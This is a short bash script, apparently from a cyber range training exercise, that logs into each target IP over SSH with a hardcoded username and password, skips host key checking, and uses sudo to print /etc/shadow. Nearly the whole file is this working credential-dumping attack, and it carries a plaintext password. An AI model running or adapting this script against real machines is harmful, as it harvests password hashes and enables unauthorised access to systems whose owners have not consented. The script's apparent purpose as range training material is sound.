#!/bin/bash
<<COMMENT

=============================================================================

 Central Texas Cyber Range (CTCR)

=============================================================================

 Maker:       Ethan Vowels

 Maintainer:  Ethan Vowels

 Project:     CIIRC

 Filename:    initialConnection.sh

Git: Abanisenioluwa_oroj1

 Description:

    This script uses openssh to connect and look at sensitive files on the target machines.

 Extension Principle:

    None

 License:

    MIT

 Additional Information:

    - Date Created: 5/22/2024

    - Last Updated: 5/22/2024

    - Contact: ethan_vowels1@baylor.edu

    - Repository: Gitlab CIIRC Hack

=============================================================================

COMMENT

# Ensure this script is run with IP addresses as arguments
if [ $# -lt 1 ]; then
  echo "Usage: $0 <IP_Address1> [IP_Address2] ..."
  exit 1
fi

# Collect all IP addresses provided as arguments
TARGET_IPS=("$@")

# SSH User and Password
SSH_USER="hr"
SSH_PASS="MegaBiteRules23!"

for TARGET_IP in "${TARGET_IPS[@]}"; do
  echo "Processing target: $TARGET_IP"

  #Connecting and going to /etc/shadow
  sshpass -p "$SSH_PASS" ssh -o StrictHostKeyChecking=no $SSH_USER@"$TARGET_IP" "echo '$SSH_PASS' | sudo -S cat /etc/shadow"

  echo "Done with target: $TARGET_IP"
done